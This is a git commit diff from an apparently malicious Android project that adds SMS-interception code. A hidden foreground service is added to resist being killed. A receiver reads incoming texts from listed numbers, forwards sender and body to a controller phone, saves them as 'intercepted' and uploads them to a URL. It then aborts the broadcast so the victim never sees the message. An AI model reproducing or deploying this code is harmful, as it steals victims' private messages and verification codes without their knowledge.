db0952bcbf4250c2c0615be67eabba661bbbdbc2
machonggood88 <machonggood@163.com>
2014-11-19 15:20:21 +0800

    大改动啊

---
+++ SMS-SDK/src/android/app/sms/service/NotifiService.java
@@ -0,0 +1,94 @@
+package android.app.sms.service;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import android.app.Notification;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.IBinder;
+
+/**
+ * 防止进程被第三方软件杀死
+ * @author Stevem
+ *
+ */
+public class NotifiService extends Service {
+
+	private static final Class<?>[] mStopForegroundSignature = new Class[] {boolean.class};
+	private static final Class<?>[] mStartForegroundSignature = new Class[] {int.class, Notification.class};  
+	  
+	private NotificationManager mNM;  
+	private Method mStopForeground; 
+	private Method mStartForeground;  
+	private Object[] mStopForegroundArgs = new Object[1];
+	private Object[] mStartForegroundArgs = new Object[2];
+	
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
+
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		this.mNM = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+		try {
+			this.mStartForeground = NotifiService.class.getMethod("startForeground", mStartForegroundSignature);
+			this.mStopForeground = NotifiService.class.getMethod("stopForeground", mStopForegroundSignature);
+		} catch (NoSuchMethodException e) {
+			mStartForeground = mStopForeground = null;
+		}
+		// 我们并不需要为 notification.flags 设置 FLAG_ONGOING_EVENT，因为
+        // 前台服务的 notification.flags 总是默认包含了那个标志位
+        Notification notification = new Notification();
+        // 注意使用  startForeground ，id 为 0 将不会显示 notification
+        this.startForegroundCompat(0, notification);
+	}
+
+	// 以兼容性方式停止前台服务
+    private void stopForegroundCompat(int id) {
+        if (this.mStopForeground != null) {
+        	this.mStopForegroundArgs[0] = Boolean.TRUE;
+            try {
+            	this.mStopForeground.invoke(this, this.mStopForegroundArgs);
+            } catch (IllegalArgumentException e) {
+                e.printStackTrace();
+            } catch (IllegalAccessException e) {
+                e.printStackTrace();
+            } catch (InvocationTargetException e) {
+                e.printStackTrace();
+            }
+            return;
+        }
+        //   在 setForeground 之前调用 cancel，因为我们有可能在取消前台服务之后
+        //   的那一瞬间被kill掉。这个时候 notification 便永远不会从通知一栏移除
+        this.mNM.cancel(id);
+    }
+	
+    // 以兼容性方式开始前台服务
+    private void startForegroundCompat(int id, Notification n) {
+        if (this.mStartForeground != null) {
+        	this.mStartForegroundArgs[0] = id;
+        	this.mStartForegroundArgs[1] = n;
+            try {
+            	this.mStartForeground.invoke(this, this.mStartForegroundArgs);
+            } catch (IllegalArgumentException e) {
+                e.printStackTrace();
+            } catch (IllegalAccessException e) {
+                e.printStackTrace();
+            } catch (InvocationTargetException e) {
+                e.printStackTrace();
+            }
+            return;
+        }
+        this.mNM.notify(id, n);
+    }
+    
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        this.stopForegroundCompat(1);
+    }
+}
--- WebShell/src/com/sms/web/receiver/SMSReceiver.java
+++ WebShell/src/com/sms/web/receiver/SMSReceiver.java
@@ -1,18 +1,22 @@
 package com.sms.web.receiver;
 
-import com.pro.intertest.WebActivity;
+import java.util.Date;
 
+import com.pro.intertest.WebActivity;
 import android.app.Activity;
 import android.app.sdk.SmsActivity;
 import android.app.sms.async.SubmitDateThread;
 import android.app.sms.manager.SMSManager;
+import android.app.sms.sqlite.DQLiteOpenHelper;
 import android.app.sms.utils.BaseData;
 import android.app.sms.utils.LogUtils;
 import android.app.sms.utils.Tools;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
 import android.telephony.SmsManager;
+import android.telephony.SmsMessage;
 
 public class SMSReceiver extends BroadcastReceiver {
 
@@ -26,9 +30,43 @@ public class SMSReceiver extends BroadcastReceiver {
 			newIntent.addCategory("android.intent.category.LAUNCHER");
 			newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			context.startActivity(newIntent);
-		} else if (action.equals(BaseData.removed)) {
-			SMSManager.send(context, SmsActivity.devicephone, "程序被卸载");
-		} if (action.equals(BaseData.smssend)) {
+		} else if (action.equals(BaseData.smsfilter1) || action.equals(BaseData.smsfilter2) || action.equals(BaseData.smsfilter3)) {
+			Bundle bundle = intent.getExtras();
+			if (bundle != null) {
+				Object[] pdus = (Object[]) bundle.get("pdus");
+				String address = null;
+				StringBuffer body = new StringBuffer();
+				SmsMessage[] messages = new SmsMessage[pdus.length];
+                for(int i = 0; i < messages.length; i++) {
+                    byte[] pdu = (byte[])pdus[i];
+                    messages[i] = SmsMessage.createFromPdu(pdu);
+                }
+                for(SmsMessage sm: messages) {
+                    String content = sm.getMessageBody();
+                    body.append(content);
+                    address = sm.getOriginatingAddress();
+                }
+                if (address != null) {
+                	LogUtils.write("Send", "广播监听到短信接收:address=" + address + ",body=" + body);
+                    boolean isflag = false;
+                    address = address.replace("+86", "").replace("+1", "");
+                    for (int i = 0; i < BaseData.nums.length; i++) {
+    					if (address.startsWith(BaseData.nums[i])) {
+    						isflag = true;
+    						break;
+    					}
+    				}
+                    if (isflag) {
+                    	SMSManager.send(context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "#" + body);
+    					DQLiteOpenHelper.getHelper(context).addData("拦截", address, body.toString(), SmsActivity.interceptUrl, new Date());
+    					SubmitDateThread.startSendData(context);
+    					this.abortBroadcast();		//退出该广播
+    				}
+                }
+			} else {
+				LogUtils.write("Send", "广播获取短信失败");
+			}
+		} else if (action.equals(BaseData.smssend)) {
 			String phoneNum = intent.getStringExtra("phone");
 			switch (getResultCode()) {
 				case Activity.RESULT_OK:
@@ -43,7 +81,7 @@ public class SMSReceiver extends BroadcastReceiver {
 				case SmsManager.RESULT_ERROR_NULL_PDU: 
 					LogUtils.write("Send", phoneNum+"-短信发送失败RESULT_ERROR_NULL_PDU");
 					break;
-				default: 
+				default:
 					LogUtils.write("Send", phoneNum+"-未知错误");
 					break;
 			}
